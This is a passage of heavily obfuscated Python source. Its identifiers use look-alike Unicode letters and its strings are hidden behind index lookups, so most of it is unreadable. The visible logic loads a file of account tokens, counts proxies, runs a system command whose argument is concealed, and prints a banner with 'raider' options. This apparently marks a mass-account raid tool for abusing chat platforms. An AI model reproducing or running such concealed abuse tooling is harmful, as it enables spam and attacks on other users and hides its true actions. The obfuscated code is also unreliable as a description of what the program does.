𝘐𝙡𝗜𝘕𝘐𝘕𝙉𝙄𝗠𝙉𝘕𝘐𝙡[42]}{𝙧}{𝗠𝘔𝙉𝘐𝙈𝗜𝙈𝗜𝙡𝙈𝙉𝗡𝗠𝙉𝘭𝙈𝘔𝘭𝗠𝘐𝘭𝘐𝘕𝙄𝙉𝗡𝗜𝗠𝙉𝙉𝙄𝗹[49]}{𝙡𝙘}{𝗠𝘔𝘕𝙄𝗠𝗜𝘔𝙄𝗹𝗠𝙉𝙉𝗠𝙉𝙡𝘔𝙈𝗹𝘔𝗜𝘭𝙄𝙉𝙄𝗡𝗡𝗜𝗠𝙉𝗡𝘐𝗹[33]}{𝗿}{𝙈𝘔𝘕𝘐𝘔𝙄𝘔𝗜𝘭𝗠𝙉𝙉𝘔𝘕𝗹𝙈𝘔𝘭𝙈𝘐𝘭𝙄𝘕𝙄𝗡𝙉𝙄𝙈𝘕𝗡𝘐𝙡[34]}{𝙡𝗰}{𝘔𝗠𝘕𝘐𝙈𝘐𝙈𝙄𝘭𝙈𝗡𝘕𝙈𝙉𝙡𝘔𝗠𝘭𝘔𝗜𝗹𝘐𝙉𝘐𝘕𝘕𝗜𝗠𝘕𝘕𝘐𝗹[44]}{𝗿}{𝙈𝙈𝙉𝗜𝗠𝗜𝘔𝗜𝘭𝗠𝙉𝘕𝗠𝘕𝘭𝘔𝙈𝙡𝙈𝘐𝙡𝘐𝙉𝘐𝙉𝗡𝘐𝘔𝘕𝘕𝘐𝘭[34]}{𝗹𝗰}{𝙈𝗠𝘕𝘐𝘔𝘐𝗠𝗜𝘭𝗠𝘕𝙉𝘔𝗡𝗹𝙈𝗠𝘭𝗠𝙄𝙡𝘐𝙉𝗜𝗡𝗡𝗜𝗠𝙉𝘕𝙄𝙡[42]}{𝘳}{𝗠𝙈𝙉𝘐𝙈𝘐𝘔𝘐𝙡𝗠𝘕𝘕𝗠𝗡𝙡𝙈𝘔𝗹𝗠𝗜𝘭𝗜𝗡𝙄𝙉𝙉𝗜𝙈𝙉𝘕𝘐𝙡[34]}{𝘭𝙘}{𝙈𝗠𝘕𝗜𝙈𝘐𝗠𝗜𝙡𝙈𝘕𝙉𝗠𝘕𝗹𝘔𝘔𝗹𝗠𝗜𝘭𝘐𝗡𝗜𝘕𝘕𝙄𝗠𝘕𝙉𝗜𝗹[45]}{𝗿}{𝙈𝙈𝘕𝙄𝙈𝙄𝗠𝗜𝘭𝙈𝘕𝘕𝙈𝘕𝙡𝘔𝙈𝘭𝘔𝘐𝗹𝗜𝘕𝘐𝗡𝗡𝙄𝙈𝙉𝘕𝙄𝘭[34]}{𝘭𝗰}{𝙈𝗠𝘕𝗜𝗠𝗜𝘔𝙄𝗹𝘔𝘕𝗡𝗠𝘕𝘭𝙈𝘔𝙡𝘔𝙄𝙡𝙄𝙉𝙄𝗡𝗡𝘐𝙈𝙉𝙉𝙄𝗹[42]}{𝙧}{𝙈𝙈𝗡𝙄𝘔𝗜𝘔𝙄𝙡𝗠𝘕𝙉𝘔𝘕𝙡𝘔𝙈𝗹𝗠𝙄𝙡𝗜𝗡𝘐𝘕𝘕𝙄𝘔𝘕𝘕𝘐𝗹[34]}{𝙡𝙘}{𝘔𝗠𝗡𝗜𝘔𝘐𝙈𝙄𝘭𝗠𝘕𝗡𝗠𝘕𝗹𝘔𝙈𝘭𝙈𝘐𝗹𝗜𝙉𝙄𝙉𝙉𝙄𝘔𝗡𝙉𝗜𝘭[50]}{𝙧}{𝘔𝘔𝘕𝗜𝗠𝙄𝗠𝗜𝙡𝙈𝘕𝘕𝙈𝗡𝗹𝙈𝘔𝙡𝙈𝙄𝙡𝗜𝙉𝙄𝘕𝘕𝗜𝗠𝙉𝗡𝙄𝘭[46]}{𝙡𝘤}{𝗠𝙈𝗡𝘐𝙈𝘐𝗠𝗜𝙡𝙈𝙉𝗡𝙈𝘕𝗹𝗠𝘔𝙡𝗠𝙄𝗹𝗜𝙉𝗜𝙉𝘕𝙄𝙈𝘕𝙉𝗜𝗹[50]}{𝙧}{𝘔𝘔𝘕𝗜𝘔𝘐𝗠𝗜𝙡𝙈𝙉𝙉𝙈𝙉𝘭𝙈𝗠𝗹𝙈𝙄𝘭𝙄𝙉𝙄𝗡𝘕𝙄𝙈𝗡𝗡𝙄𝙡[34]}{𝗹𝘤}{𝘔𝙈𝗡𝗜𝙈𝗜𝘔𝘐𝘭𝙈𝗡𝗡𝙈𝘕𝘭𝘔𝙈𝗹𝙈𝙄𝗹𝗜𝗡𝘐𝙉𝗡𝘐𝙈𝘕𝗡𝗜𝙡[42]}{𝗿}{𝙈𝗠𝘕𝘐𝙈𝘐𝗠𝙄𝗹𝗠𝘕𝙉𝘔𝗡𝙡𝘔𝙈𝘭𝙈𝙄𝘭𝘐𝘕𝘐𝘕𝘕𝘐𝘔𝘕𝙉𝘐𝙡[51]}{𝘭𝙘}{𝗠𝙈𝘕𝗜𝗠𝗜𝘔𝙄𝘭𝗠𝙉𝘕𝙈𝙉𝙡𝗠𝗠𝙡𝗠𝘐𝘭𝘐𝙉𝘐𝘕𝗡𝗜𝘔𝙉𝙉𝙄𝙡[52]}{𝙧}{𝙈𝗠𝙉𝙄𝙈𝘐𝙈𝘐𝙡𝙈𝗡𝗡𝗠𝘕𝗹𝗠𝙈𝗹𝙈𝘐𝙡𝙄𝙉𝙄𝘕𝘕𝗜𝙈𝘕𝙉𝙄𝙡[34]}{𝙡𝘤}{𝙈𝗠𝙉𝘐𝗠𝘐𝙈𝘐𝙡𝙈𝗡𝘕𝙈𝗡𝙡𝘔𝙈𝙡𝙈𝙄𝘭𝗜𝗡𝗜𝙉𝘕𝙄𝘔𝘕𝙉𝙄𝘭[42]}{𝙧}{𝘔𝗠𝗡𝗜𝙈𝗜𝗠𝘐𝗹𝗠𝙉𝘕𝗠𝙉𝗹𝗠𝘔𝘭𝙈𝙄𝗹𝗜𝘕𝘐𝘕𝘕𝘐𝙈𝗡𝙉𝗜𝗹[34]}{𝙡𝘤}{𝘔𝘔𝗡𝙄𝗠𝗜𝗠𝙄𝘭𝘔𝙉𝘕𝗠𝗡𝙡𝘔𝘔𝗹𝙈𝗜𝘭𝙄𝘕𝙄𝘕𝘕𝙄𝘔𝘕𝘕𝙄𝗹[53]}{𝙧}{𝘔𝘔𝘕𝗜𝗠𝙄𝙈𝗜𝗹𝗠𝙉𝘕𝙈𝘕𝗹𝙈𝘔𝙡𝘔𝘐𝘭𝙄𝙉𝘐𝘕𝙉𝙄𝘔𝘕𝘕𝘐𝗹[34]}{𝙡𝗰}{𝙈𝘔𝙉𝙄𝘔𝙄𝗠𝘐𝗹𝘔𝗡𝗡𝗠𝗡𝗹𝘔𝘔𝗹𝙈𝘐𝘭𝙄𝗡𝘐𝗡𝙉𝙄𝘔𝙉𝘕𝙄𝙡[44]}{𝙧}{𝘔𝙈𝗡𝗜𝗠𝙄𝘔𝗜𝘭𝘔𝘕𝙉𝙈𝘕𝗹𝙈𝙈𝗹𝙈𝘐𝙡𝗜𝗡𝘐𝙉𝙉𝙄𝗠𝗡𝘕𝘐𝗹[34]}{𝘭𝙘}{𝘔𝙈𝗡𝙄𝙈𝗜𝙈𝗜𝙡𝙈𝙉𝙉𝘔𝘕𝗹𝙈𝘔𝘭𝙈𝘐𝗹𝗜𝙉𝘐𝗡𝘕𝘐𝘔𝘕𝙉𝙄𝘭[42]}{𝙧}{𝙈𝗠𝘕𝗜𝗠𝘐𝗠𝗜𝗹𝘔𝗡𝗡𝘔𝘕𝘭𝗠𝙈𝘭𝗠𝗜𝘭𝗜𝗡𝙄𝙉𝙉𝙄𝘔𝗡𝗡𝗜𝗹[34]}{𝙡𝘤}{𝗠𝗠𝙉𝗜𝗠𝗜𝙈𝘐𝙡𝗠𝘕𝗡𝙈𝙉𝗹𝘔𝘔𝘭𝗠𝗜𝙡𝘐𝘕𝗜𝘕𝘕𝙄𝙈𝘕𝗡𝗜𝗹[45]}{𝘳}{𝘔𝘔𝗡𝙄𝙈𝙄𝗠𝗜𝗹𝙈𝘕𝗡𝙈𝗡𝘭𝗠𝙈𝗹𝗠𝗜𝙡𝙄𝗡𝗜𝙉𝘕𝙄𝗠𝘕𝙉𝘐𝙡[34]}{𝗹𝗰}{𝘔𝙈𝗡𝘐𝘔𝘐𝘔𝙄𝘭𝗠𝘕𝘕𝙈𝗡𝙡𝙈𝙈𝙡𝗠𝗜𝘭𝘐𝙉𝗜𝗡𝙉𝘐𝘔𝗡𝙉𝗜𝙡[42]}{𝙧}{𝘔𝗠𝗡𝙄𝗠𝘐𝗠𝗜𝗹𝙈𝗡𝗡𝗠𝙉𝙡𝗠𝗠𝘭𝗠𝘐𝘭𝗜𝗡𝘐𝗡𝘕𝘐𝗠𝘕𝗡𝘐𝘭[34]}{𝗹𝙘}{𝗠𝙈𝗡𝗜𝘔𝗜𝘔𝙄𝙡𝘔𝙉𝗡𝘔𝗡𝗹𝘔𝙈𝘭𝘔𝙄𝗹𝗜𝘕𝙄𝙉𝙉𝘐𝘔𝘕𝗡𝙄𝙡[54]}{𝗿}{𝗠𝗠𝘕𝘐𝙈𝗜𝘔𝙄𝗹𝗠𝗡𝙉𝘔𝗡𝘭𝙈𝘔𝙡𝘔𝘐𝗹𝗜𝘕𝗜𝗡𝘕𝘐𝗠𝗡𝙉𝘐𝘭[34]}{𝘭𝗰}{𝙈𝙈𝘕𝙄𝙈𝗜𝘔𝙄𝙡𝘔𝗡𝗡𝙈𝘕𝗹𝗠𝗠𝙡𝗠𝘐𝙡𝗜𝗡𝗜𝗡𝗡𝗜𝙈𝙉𝙉𝗜𝗹[55]}{𝗿}{𝗠𝗠𝗡𝘐𝗠𝙄𝙈𝘐𝗹𝘔𝘕𝘕𝙈𝗡𝙡𝙈𝗠𝗹𝘔𝗜𝘭𝙄𝙉𝗜𝘕𝙉𝗜𝙈𝘕𝙉𝘐𝘭[34]}{𝗹𝘤}{𝘔𝘔𝗡𝙄𝙈𝘐𝘔𝗜𝙡𝗠𝙉𝗡𝙈𝙉𝗹𝘔𝘔𝘭𝘔𝘐𝘭𝘐𝙉𝙄𝗡𝙉𝘐𝗠𝘕𝘕𝙄𝗹[42]}{𝗿}{𝙈𝘔𝙉𝗜𝙈𝙄𝗠𝙄𝙡𝘔𝗡𝗡𝘔𝙉𝙡𝗠𝗠𝙡𝗠𝗜𝙡𝙄𝘕𝗜𝙉𝗡𝙄𝘔𝘕𝗡𝗜𝘭[51]}{𝘭𝙘}{𝘔𝘔𝗡𝘐𝙈𝘐𝗠𝗜𝗹𝙈𝘕𝘕𝗠𝗡𝙡𝘔𝗠𝘭𝘔𝗜𝙡𝗜𝙉𝘐𝙉𝗡𝙄𝙈𝘕𝘕𝘐𝙡[41]}{𝘳}{𝘔𝙈𝘕𝗜𝗠𝘐𝙈𝘐𝙡𝘔𝙉𝘕𝗠𝙉𝘭𝘔𝘔𝗹𝙈𝘐𝘭𝘐𝘕𝙄𝘕𝘕𝘐𝗠𝘕𝗡𝘐𝙡[34]}{𝙡𝗰}{𝙈𝘔𝘕𝗜𝗠𝙄𝗠𝙄𝘭𝗠𝘕𝙉𝗠𝗡𝘭𝘔𝗠𝗹𝙈𝙄𝘭𝙄𝙉𝘐𝙉𝘕𝙄𝙈𝙉𝙉𝘐𝙡[42]}{𝙧}{𝘔𝘔𝙉𝗜𝘔𝘐𝘔𝙄𝙡𝗠𝘕𝙉𝗠𝙉𝘭𝙈𝙈𝗹𝘔𝙄𝗹𝗜𝗡𝗜𝙉𝘕𝗜𝙈𝘕𝗡𝘐𝗹[36]}{𝙡𝗰}{𝙈𝙈𝙉𝗜𝙈𝗜𝙈𝘐𝗹𝗠𝗡𝙉𝘔𝗡𝘭𝗠𝘔𝙡𝘔𝙄𝘭𝙄𝙉𝗜𝙉𝘕𝙄𝗠𝗡𝘕𝘐𝗹[35]}{𝗿}{𝗠𝘔𝘕𝗜𝙈𝘐𝙈𝙄𝗹𝙈𝙉𝗡𝙈𝗡𝘭𝘔𝙈𝘭𝗠𝘐𝙡𝙄𝘕𝗜𝗡𝘕𝙄𝗠𝘕𝘕𝙄𝗹[36]}{𝙡𝗰}{𝗠𝘔𝙉𝗜𝗠𝙄𝘔𝙄𝘭𝙈𝙉𝘕𝘔𝘕𝗹𝗠𝙈𝙡𝘔𝗜𝗹𝘐𝘕𝗜𝙉𝙉𝗜𝙈𝙉𝘕𝗜𝘭[35]}{𝙧}{𝗠𝙈𝘕𝙄𝙈𝗜𝗠𝗜𝙡𝘔𝗡𝙉𝗠𝗡𝗹𝗠𝗠𝗹𝗠𝗜𝗹𝗜𝗡𝗜𝗡𝘕𝗜𝙈𝙉𝙉𝙄𝘭[34]}{𝙡𝗰}{𝙈𝘔𝘕𝘐𝙈𝗜𝗠𝗜𝙡𝙈𝗡𝘕𝙈𝘕𝙡𝙈𝙈𝘭𝘔𝗜𝘭𝘐𝗡𝗜𝘕𝗡𝙄𝗠𝙉𝙉𝙄𝙡[54]}{𝙧}{𝙈𝙈𝗡𝗜𝘔𝙄𝘔𝙄𝘭𝘔𝘕𝙉𝗠𝗡𝗹𝘔𝗠𝗹𝙈𝗜𝘭𝘐𝙉𝗜𝗡𝘕𝗜𝙈𝙉𝗡𝗜𝘭[56]}{𝗹𝙘}{𝙈𝗠𝙉𝗜𝗠𝘐𝘔𝗜𝙡𝙈𝙉𝘕𝘔𝘕𝙡𝙈𝘔𝗹𝗠𝗜𝙡𝗜𝗡𝙄𝘕𝗡𝘐𝗠𝗡𝘕𝙄𝙡[55]}{𝙧}{𝗠𝗠𝘕𝙄𝙈𝗜𝙈𝙄𝙡𝙈𝙉𝘕𝘔𝙉𝗹𝗠𝙈𝗹𝗠𝙄𝙡𝗜𝗡𝗜𝙉𝙉𝘐𝗠𝗡𝗡𝘐𝘭[34]}{𝙡𝗰}{𝗠𝘔𝘕𝗜𝗠𝙄𝗠𝙄𝗹𝗠𝙉𝙉𝗠𝙉𝗹𝘔𝘔𝙡𝘔𝘐𝗹𝗜𝙉𝘐𝙉𝙉𝙄𝘔𝗡𝙉𝙄𝘭[57]}{𝘳}{𝙈𝗠𝘕𝗜𝙈𝘐𝗠𝙄𝗹𝙈𝘕𝙉𝘔𝙉𝘭𝙈𝗠𝗹𝙈𝘐𝙡𝘐𝘕𝙄𝙉𝗡𝙄𝙈𝘕𝗡𝙄𝙡[34]}{𝘭𝘤}{𝙈𝗠𝗡𝘐𝗠𝙄𝗠𝗜𝘭𝙈𝙉𝘕𝙈𝗡𝙡𝘔𝘔𝗹𝗠𝗜𝘭𝘐𝗡𝘐𝗡𝘕𝗜𝘔𝗡𝙉𝗜𝗹[58]}'
with 𝙤𝘱𝙚𝙣(𝘔𝘔𝙉𝘐𝗠𝘐𝘔𝙄𝗹𝗠𝘕𝙉𝘔𝘕𝘭𝘔𝙈𝙡𝙈𝙄𝘭𝗜𝘕𝙄𝙉𝗡𝗜𝗠𝙉𝙉𝗜𝘭[59], 𝗠𝗠𝗡𝙄𝙈𝗜𝗠𝗜𝙡𝙈𝙉𝙉𝙈𝗡𝙡𝗠𝗠𝗹𝙈𝗜𝙡𝙄𝗡𝗜𝘕𝗡𝘐𝘔𝘕𝗡𝗜𝙡[30]) as 𝙛:
    𝘁𝙤𝗸𝗲𝙣𝙨 = 𝙛.read().splitlines()

def wrapper(func):

    def wrapper(*args, **kwargs):
        𝗰𝗼𝗻𝘴𝙤𝙡𝘦.render_ascii()
        𝙧𝗲𝘴𝘶𝗹𝘵 = 𝘧𝙪𝙣𝗰(*𝘢𝘳𝗴𝘴, **𝗸𝘸𝗮𝙧𝗴𝘀)
        return 𝗿𝙚𝘀𝘂𝘭𝘁
    return 𝙬𝘳𝗮𝘱𝘱𝘦𝗿

class Render:

    def __init__(self):
        𝘀𝙚𝘁𝗮𝙩𝘵𝙧(𝙨𝘦𝙡𝘧, 'size', 𝙤𝘀.get_terminal_size().columns)

    def render_ascii(self):
        𝗼𝘴.system(𝗠𝗠𝘕𝘐𝙈𝙄𝘔𝗜𝘭𝘔𝘕𝗡𝗠𝙉𝘭𝘔𝘔𝙡𝘔𝙄𝘭𝗜𝗡𝙄𝙉𝙉𝘐𝙈𝘕𝘕𝘐𝘭[1])
        with 𝗼𝗽𝙚𝘯(𝗠𝘔𝙉𝘐𝘔𝗜𝘔𝗜𝗹𝙈𝙉𝗡𝘔𝗡𝙡𝙈𝙈𝗹𝗠𝙄𝙡𝙄𝗡𝗜𝘕𝙉𝙄𝙈𝙉𝗡𝗜𝙡[59], 𝗠𝙈𝘕𝘐𝗠𝙄𝙈𝗜𝗹𝘔𝙉𝙉𝘔𝙉𝗹𝘔𝗠𝗹𝙈𝗜𝘭𝘐𝗡𝘐𝗡𝗡𝘐𝙈𝘕𝗡𝗜𝘭[30]) as 𝙛:
            𝘁𝗼𝗸𝙚𝙣𝘀 = 𝙛.read().splitlines()
        𝙚𝘥𝗴𝘦𝙨 = [𝗠𝘔𝘕𝗜𝘔𝗜𝗠𝘐𝙡𝙈𝙉𝘕𝗠𝙉𝘭𝗠𝗠𝗹𝙈𝙄𝗹𝙄𝙉𝗜𝙉𝙉𝙄𝘔𝘕𝙉𝗜𝗹[35], 𝙈𝙈𝗡𝗜𝗠𝙄𝙈𝙄𝗹𝘔𝘕𝙉𝙈𝘕𝙡𝙈𝙈𝙡𝗠𝘐𝘭𝙄𝘕𝘐𝗡𝙉𝘐𝙈𝗡𝘕𝙄𝙡[42], 𝙈𝗠𝗡𝗜𝙈𝘐𝙈𝘐𝗹𝗠𝘕𝙉𝗠𝘕𝘭𝙈𝘔𝗹𝗠𝙄𝘭𝗜𝘕𝘐𝘕𝗡𝗜𝗠𝗡𝗡𝘐𝘭[60], 𝗠𝘔𝗡𝗜𝗠𝘐𝙈𝙄𝘭𝘔𝘕𝗡𝘔𝗡𝙡𝘔𝘔𝘭𝗠𝙄𝙡𝘐𝘕𝘐𝘕𝗡𝘐𝙈𝗡𝙉𝙄𝗹[61], 𝙈𝗠𝘕𝘐𝘔𝘐𝘔𝙄𝘭𝗠𝙉𝙉𝗠𝘕𝘭𝙈𝗠𝘭𝙈𝘐𝙡𝙄𝙉𝙄𝙉𝘕𝗜𝘔𝗡𝙉𝘐𝗹[62], 𝗠𝙈𝘕𝗜𝗠𝗜𝙈𝙄𝘭𝘔𝙉𝘕𝗠𝗡𝙡𝘔𝘔𝙡𝙈𝘐𝗹𝘐𝙉𝘐𝙉𝘕𝗜𝗠𝗡𝗡𝙄𝗹[50]]
        𝘁𝘪𝘵𝘭𝗲 = f"{𝘔𝘔𝘕𝗜𝗠𝘐𝘔𝘐𝙡𝘔𝙉𝘕𝙈𝙉𝗹𝗠𝙈𝗹𝗠𝗜𝗹𝘐𝗡𝗜𝘕𝙉𝘐𝙈𝘕𝗡𝙄𝘭[63]}{𝗠𝙈𝙉𝙄𝗠𝙄𝙈𝘐𝙡𝗠𝙉𝗡𝙈𝗡𝘭𝙈𝘔𝙡𝙈𝘐𝘭𝗜𝘕𝘐𝗡𝗡𝙄𝙈𝗡𝗡𝗜𝗹[64].center(𝙨𝙚𝗹𝗳.size)}{𝗠𝘔𝗡𝙄𝘔𝗜𝙈𝗜𝙡𝙈𝘕𝘕𝙈𝗡𝗹𝙈𝙈𝘭𝘔𝙄𝙡𝙄𝘕𝙄𝘕𝙉𝗜𝘔𝙉𝙉𝘐𝙡[63]}{𝙈𝘔𝘕𝗜𝙈𝘐𝗠𝗜𝙡𝙈𝗡𝘕𝗠𝗡𝘭𝙈𝙈𝙡𝗠𝘐𝘭𝘐𝗡𝙄𝘕𝘕𝗜𝘔𝗡𝙉𝘐𝘭[65].center(𝘴𝘦𝗹𝘧.size)}{𝙈𝘔𝘕𝙄𝘔𝗜𝙈𝘐𝘭𝙈𝙉𝙉𝗠𝗡𝙡𝙈𝘔𝗹𝗠𝙄𝗹𝘐𝗡𝙄𝗡𝗡𝙄𝘔𝘕𝗡𝙄𝗹[63]}{𝗠𝘔𝗡𝗜𝙈𝙄𝘔𝗜𝘭𝘔𝙉𝙉𝘔𝙉𝙡𝗠𝗠𝘭𝗠𝗜𝙡𝘐𝗡𝙄𝙉𝘕𝗜𝘔𝘕𝙉𝗜𝙡[66].center(𝘀𝙚𝘭𝗳.size)}{𝘔𝗠𝙉𝘐𝙈𝗜𝗠𝗜𝙡𝙈𝘕𝘕𝗠𝘕𝙡𝘔𝘔𝙡𝙈𝙄𝗹𝘐𝗡𝙄𝙉𝙉𝘐𝙈𝘕𝙉𝗜𝘭[63]}{𝙈𝗠𝗡𝙄𝙈𝙄𝙈𝙄𝙡𝙈𝘕𝘕𝗠𝘕𝘭𝗠𝗠𝘭𝙈𝙄𝙡𝙄𝗡𝗜𝘕𝗡𝙄𝙈𝙉𝘕𝙄𝙡[67].center(𝘴𝘦𝗹𝙛.size)}{𝗠𝘔𝗡𝗜𝙈𝙄𝙈𝙄𝙡𝘔𝗡𝙉𝘔𝘕𝙡𝙈𝘔𝘭𝙈𝙄𝙡𝘐𝙉𝙄𝙉𝗡𝙄𝗠𝗡𝘕𝗜𝙡[63]}{𝙈𝘔𝗡𝘐𝗠𝘐𝘔𝙄𝗹𝙈𝘕𝘕𝗠𝙉𝘭𝙈𝙈𝘭𝗠𝘐𝙡𝙄𝘕𝘐𝘕𝙉𝘐𝗠𝗡𝘕𝗜𝗹[68].center(𝘴𝗲𝙡𝘧.size)}{𝘔𝘔𝗡𝗜𝘔𝗜𝗠𝙄𝘭𝗠𝙉𝘕𝘔𝙉𝗹𝙈𝘔𝙡𝘔𝗜𝘭𝗜𝙉𝙄𝙉𝘕𝗜𝙈𝙉𝙉𝘐𝘭[63]}{𝗠𝘔𝗡𝘐𝗠𝙄𝗠𝗜𝘭𝗠𝘕𝗡𝘔𝙉𝗹𝘔𝘔𝗹𝙈𝘐𝗹𝗜𝗡𝘐𝘕𝗡𝗜𝘔𝘕𝙉𝗜𝙡[69].center(𝙨𝘦𝘭𝙛.size)}{𝙈𝗠𝘕𝗜𝗠𝘐𝗠𝙄𝙡𝙈𝙉𝗡𝗠𝘕𝘭𝘔𝗠𝗹𝘔𝗜𝙡𝗜𝘕𝙄𝘕𝗡𝙄𝘔𝘕𝗡𝙄𝗹[70]}{f'{𝘔𝘔𝙉𝗜𝘔𝙄𝗠𝗜𝙡𝘔𝗡𝘕𝗠𝘕𝙡𝘔𝙈𝗹𝙈𝘐𝙡𝘐𝙉𝘐𝙉𝙉𝗜𝙈𝘕𝙉𝙄𝗹[71]}{𝘳}{𝙈𝘔𝗡𝘐𝘔𝘐𝗠𝙄𝗹𝘔𝘕𝗡𝗠𝘕𝘭𝗠𝘔𝙡𝘔𝙄𝗹𝗜𝙉𝘐𝗡𝗡𝙄𝘔𝗡𝗡𝘐𝙡[72]}{𝗹𝘤}{𝘭𝘦𝘯(𝘁𝙤𝘬𝙚𝙣𝙨)}{𝗿}{𝙈𝙈𝗡𝘐𝗠𝘐𝘔𝗜𝗹𝘔𝘕𝗡𝗠𝘕𝗹𝙈𝙈𝘭𝘔𝘐𝙡𝘐𝘕𝘐𝙉𝙉𝘐𝘔𝙉𝙉𝙄𝘭[73]}{𝘭𝗰}{𝗹𝙚𝙣(𝙥𝗿𝘰𝘹𝗶𝙚𝘴)}{𝙧}{𝗠𝘔𝙉𝗜𝙈𝗜𝘔𝗜𝙡𝙈𝙉𝗡𝘔𝙉𝘭𝙈𝗠𝗹𝗠𝘐𝙡𝙄𝙉𝗜𝙉𝘕𝙄𝙈𝘕𝘕𝘐𝘭[74]}'.center(𝘀𝘦𝗹𝙛.size)}{𝗠𝙈𝙉𝙄𝙈𝙄𝗠𝘐𝙡𝘔𝗡𝗡𝗠𝗡𝗹𝘔𝙈𝗹𝗠𝘐𝙡𝗜𝘕𝗜𝘕𝗡𝙄𝙈𝙉𝘕𝙄𝘭[63]}"
        for 𝘦𝗱𝘨𝗲 in 𝘦𝗱𝙜𝘦𝙨:
            𝘁𝗶𝙩𝘭𝙚 = 𝘁𝘪𝘁𝘭𝗲.replace(𝗲𝙙𝗴𝘦, f'{𝗙𝘰𝘳𝗲.LIGHTCYAN_EX}{𝙚𝗱𝗴𝙚}{𝙁𝗼𝙧𝙚.RESET}')
        𝙥𝗿𝙞𝘯𝘵(𝘁𝘪𝘵𝙡𝘦)

    def raider_options(self):
        𝘦𝙙𝘨𝙚𝙨 = [𝗠𝗠𝗡𝗜𝘔𝙄𝙈𝙄𝙡𝘔𝗡𝘕𝗠𝘕𝙡𝙈𝘔𝘭𝘔𝘐𝗹𝗜𝘕𝙄𝙉𝘕𝘐𝗠𝗡𝘕𝘐𝗹[75], 𝘔𝙈𝘕𝘐𝙈𝘐𝗠𝙄𝘭𝗠𝘕𝗡𝗠𝘕𝗹𝙈𝘔𝘭𝙈𝗜𝗹𝗜𝗡𝙄𝘕𝙉𝗜𝘔𝙉𝗡𝘐𝙡[76], 𝘔𝙈𝘕𝘐𝙈𝗜𝘔𝙄𝙡𝙈𝗡𝘕𝘔𝘕𝗹𝗠𝗠𝙡𝘔𝘐𝗹𝘐𝙉𝗜𝗡𝗡𝗜𝙈𝘕𝗡𝗜𝗹[77], 𝘔𝗠𝙉𝘐𝗠𝙄𝘔𝙄𝗹𝙈𝗡𝘕𝙈𝘕𝗹𝗠𝗠𝘭𝙈𝘐𝘭𝗜𝙉𝙄𝙉𝗡𝗜𝙈𝗡𝙉𝘐𝘭[78], 𝙈𝘔𝗡𝗜𝙈𝙄𝗠𝗜𝘭𝘔𝗡𝘕𝗠𝙉𝘭𝘔𝗠𝙡𝘔𝘐𝘭𝙄𝗡𝙄𝙉𝙉𝘐𝗠𝙉𝘕𝘐𝘭[79], 𝗠𝙈𝙉𝗜𝘔𝘐𝘔𝙄𝗹𝘔𝗡𝙉𝘔𝗡𝗹𝗠𝙈𝗹𝗠𝗜𝙡𝗜𝗡𝘐𝗡𝗡𝘐𝗠𝘕𝘕𝘐𝗹[80], 𝙈𝗠𝘕𝙄𝘔𝗜𝗠𝗜𝗹𝗠𝘕𝙉𝘔𝙉𝗹𝘔𝘔𝙡𝗠𝗜𝗹𝘐𝗡𝘐𝙉𝗡𝘐𝙈𝙉𝗡𝙄𝘭[81], 𝙈𝗠𝘕𝙄𝗠𝗜𝘔𝘐𝘭𝘔𝗡𝘕𝘔𝙉𝘭𝙈𝘔𝗹𝗠𝙄𝙡𝗜𝘕𝙄𝗡𝗡𝙄𝘔𝗡𝘕𝘐𝘭[82]]
        𝘵𝙞𝘁𝘭𝘦 = f'{𝙈𝙈𝙉𝘐𝙈𝙄𝘔𝗜𝙡𝙈𝗡𝗡𝗠𝗡𝙡𝙈𝗠𝘭𝙈𝘐𝙡𝗜𝙉𝗜𝙉𝘕𝙄𝙈𝗡𝗡𝙄𝗹[83].center(𝙨𝙚𝘭𝗳.size)}{𝘔𝘔𝘕𝘐𝙈𝗜𝗠𝘐𝘭𝙈𝗡𝗡𝗠𝘕𝙡𝘔𝘔𝙡𝘔𝘐𝙡𝙄𝘕𝗜𝗡𝘕𝘐𝙈𝙉𝙉𝗜𝘭[63]}{𝙈𝘔𝘕𝘐𝘔𝙄𝗠𝗜𝗹𝗠𝗡𝙉𝘔𝙉𝙡𝙈𝘔𝙡𝗠𝗜𝙡𝗜𝘕𝙄𝘕𝙉𝙄𝗠𝙉𝗡𝗜𝘭[84].center(𝙨𝙚𝙡𝗳.size)}{𝘔𝘔𝘕𝘐𝘔𝗜𝙈𝗜𝗹𝘔𝗡𝗡𝘔𝘕𝗹𝗠𝗠𝘭𝙈𝙄𝗹𝘐𝘕𝙄𝘕𝗡𝘐𝙈𝘕𝗡𝘐𝘭[63]}{𝙈𝙈𝙉𝗜𝙈𝙄𝙈𝘐𝘭𝗠𝙉𝙉𝗠𝙉𝙡𝗠𝘔𝗹𝗠𝘐𝗹𝘐𝗡𝗜𝗡𝗡𝗜𝗠𝙉𝙉𝙄𝗹[85].center(𝘀𝗲𝙡𝘧.size)}{𝘔𝙈𝗡𝙄𝙈𝘐𝘔𝘐𝘭𝙈𝙉𝘕𝗠𝘕𝘭𝙈𝘔𝗹𝙈𝙄𝗹𝙄𝙉𝙄𝗡𝗡𝘐𝗠𝘕𝙉𝘐𝙡[63]}{𝘔𝘔𝙉𝗜𝙈𝘐𝙈𝗜𝗹𝘔𝙉𝘕𝘔𝙉𝘭𝙈𝙈𝗹𝙈𝙄𝙡𝙄𝙉𝘐𝙉𝙉𝗜𝗠𝘕𝗡𝗜𝘭[86].center(𝘀𝘦𝘭𝗳.size)}{𝙈𝘔𝙉𝘐𝙈𝗜𝘔𝙄𝗹𝙈𝗡𝘕𝘔𝙉𝗹𝗠𝘔𝗹𝗠𝘐𝙡𝙄𝗡𝗜𝘕𝗡𝗜𝗠𝙉𝙉𝙄𝙡[63]}{𝗠𝙈𝗡𝘐𝘔𝙄𝙈𝗜𝗹𝗠𝘕𝘕𝘔𝗡𝘭𝘔𝘔𝙡𝗠𝗜𝘭𝘐𝘕𝗜𝘕𝘕𝘐𝘔𝗡𝙉𝙄𝘭[87].center(𝙨𝗲𝙡𝙛.size)}{𝘔𝗠𝘕𝙄𝘔𝘐𝘔𝙄𝗹𝘔𝗡𝗡𝗠𝙉𝗹𝘔𝘔𝘭𝙈𝙄𝗹𝘐𝘕𝗜𝗡𝘕𝘐𝙈𝘕𝗡𝙄𝙡[63]}{𝙈𝘔𝘕𝗜𝘔𝙄𝘔𝙄𝗹𝗠𝘕𝘕𝗠𝘕𝗹𝘔𝙈𝙡𝗠𝙄𝙡𝘐𝙉𝗜𝗡𝙉𝘐𝗠𝘕𝘕𝗜𝘭[88].center(𝘀𝗲𝗹𝘧.size)}{𝗠𝘔𝗡𝗜𝘔𝗜𝗠𝗜𝘭𝙈